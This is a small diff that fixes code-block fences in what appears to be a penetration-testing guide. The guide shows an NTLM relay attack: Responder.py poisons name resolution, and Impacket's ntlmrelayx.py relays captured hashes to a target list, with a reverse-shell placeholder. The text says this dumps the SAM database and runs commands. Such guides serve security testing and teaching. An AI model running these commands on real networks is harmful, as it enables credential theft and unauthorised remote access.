@@ -162,13 +162,13 @@ Fire up the Responder.py tool:
 
 ```
 root@kali:~# python Responder.py -I eth1 -r -d -w
-``
+```
 
 In another window running the following command using Impacket Python:
 
 ```
 root@kali:~# ntlmrelayx.py -tf targets.txt -c [POWERSHELL REVERSE SHELL]
-``
+```
 
 Upon successful relay it will dump the SAM database of the target and executing a command in background using the NTLM hash.
 
